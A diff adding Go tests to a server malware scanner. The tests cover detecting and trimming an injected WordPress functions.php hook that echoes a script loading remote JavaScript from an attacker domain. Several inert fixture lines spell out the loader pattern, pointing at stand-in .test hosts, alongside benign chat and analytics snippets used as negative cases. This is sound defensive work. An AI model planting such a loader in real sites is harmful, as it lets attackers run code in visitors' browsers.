@@ -1741,3 +1741,69 @@ func TestFleetFullScanOwnPages(t *testing.T) {
 		t.Errorf("Imunify360 storage")
 	}
 }
+
+// server1.superfast (2026-11-02): a fake Cloudflare check on expresswrap.ae
+// and five other sites. One line appended to the active theme's
+// functions.php (Astra, Ohio, child themes) prints a script that loads a
+// randomly named script from the attacker's domain; the page is built in
+// the browser, so the server never holds its text. Inert shapes (the
+// domains are example names); a site's own chat and analytics snippets and
+// enqueued scripts stay clean.
+func TestFleetFooterScriptLoader(t *testing.T) {
+	s := newScanner(t)
+	theme := "<?php\n/** Astra functions and definitions */\nif ( ! defined( 'ABSPATH' ) ) { exit; }\ndefine( 'ASTRA_THEME_VERSION', '4.13.3' );\nrequire_once ASTRA_THEME_DIR . 'inc/core/class-astra-theme-options.php';\n"
+	for name, line := range map[string]string{
+		"loader":         `add_action('wp_footer', function () { echo '<script>var s=document.createElement("script");s.src="https://example-c2.test/kbS0.js";s.async=true;document.head.appendChild(s);</script>'; }, 99);`,
+		"second domain":  `add_action('wp_footer', function () { echo '<script>var s=document.createElement("script");s.src="https://another-c2.test/cA.js";s.async=true;document.head.appendChild(s);</script>'; }, 99);`,
+		"in the head":    `add_action( "wp_head", function() { echo "<script>let x = document.createElement('script'); x.src='https://c2.example.test/Qz7.js'; document.body.appendChild(x);</script>"; } );`,
+		"escaped quotes": `add_action('wp_footer', function () { echo '<script>var s=document.createElement(\"script\");s.src=\"https://example-c2.test/aB1.js\";document.head.appendChild(s);</script>'; }, 99);`,
+	} {
+		body := theme + "\n" + line + "\n"
+		d := s.checkContent("/home2/u/public_html/wp-content/themes/astra/functions.php", ".php", []byte(body))
+		if d == nil || d.Signature != "PHP.Injector.FooterScriptLoader" || d.Category != CatVirus {
+			t.Errorf("%s: %+v", name, d)
+		}
+	}
+	for name, line := range map[string]string{
+		"Crisp chat": `add_action('wp_footer', function () { echo '<script>window.$crisp=[];window.CRISP_WEBSITE_ID="1";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();</script>'; });`,
+		"named widget": `add_action('wp_footer', function () { echo '<script>var s=document.createElement("script");s.src="https://cdn.example.test/widget.js";document.head.appendChild(s);</script>'; });`,
+		"Tag Manager":  `add_action('wp_head', function () { echo "<script>(function(w,d,s,l,i){w[l]=w[l]||[];var f=d.getElementsByTagName(s)[0],j=d.createElement(s);j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-X');</script>"; });`,
+		"enqueued":     `add_action('wp_enqueue_scripts', function () { wp_enqueue_script('chat', 'https://cdn.example.test/aB1.js', array(), null, true); });`,
+	} {
+		body := theme + "\n" + line + "\n"
+		if d := s.checkContent("/home2/u/public_html/wp-content/themes/astra/functions.php", ".php", []byte(body)); d != nil {
+			t.Errorf("%s: %+v", name, d)
+		}
+	}
+}
+
+// The loader is cut from the theme's functions.php, not the whole file
+// taken away: the site keeps its theme, the original stays in quarantine.
+func TestFleetFooterScriptLoaderTrimmed(t *testing.T) {
+	s := newScanner(t)
+	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
+		t.Fatal(err)
+	}
+	dir := filepath.Join(t.TempDir(), "public_html", "wp-content", "themes", "astra")
+	os.MkdirAll(dir, 0o755)
+	p := filepath.Join(dir, "functions.php")
+	clean := "<?php\n/** Astra functions (inert fixture) */\nif ( ! defined( 'ABSPATH' ) ) { exit; }\ndefine( 'ASTRA_THEME_VERSION', '4.13.3' );\nfunction astra_fixture() { return 1; }\n"
+	loader := `add_action('wp_footer', function () { echo '<script>var s=document.createElement("script");s.src="https://example-c2.test/kbS0.js";s.async=true;document.head.appendChild(s);</script>'; }, 99);`
+	os.WriteFile(p, []byte(clean+"\n"+loader+"\n\n"+strings.Replace(loader, "kbS0", "cA", 1)+"\n"), 0o644)
+	info, _ := os.Lstat(p)
+	d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
+	if err != nil || d == nil || d.Signature != "PHP.Injector.FooterScriptLoader" {
+		t.Fatalf("not detected: %+v %v", d, err)
+	}
+	f, err := s.Record(0, "realtime", p, info, *d)
+	if err != nil || f.Status != "trimmed" {
+		t.Fatalf("%+v %v", f, err)
+	}
+	got, err := os.ReadFile(p)
+	if err != nil {
+		t.Fatal("theme file taken away")
+	}
+	if strings.Contains(string(got), "createElement") || !strings.Contains(string(got), "function astra_fixture()") {
+		t.Fatalf("not trimmed: %q", got)
+	}
+}
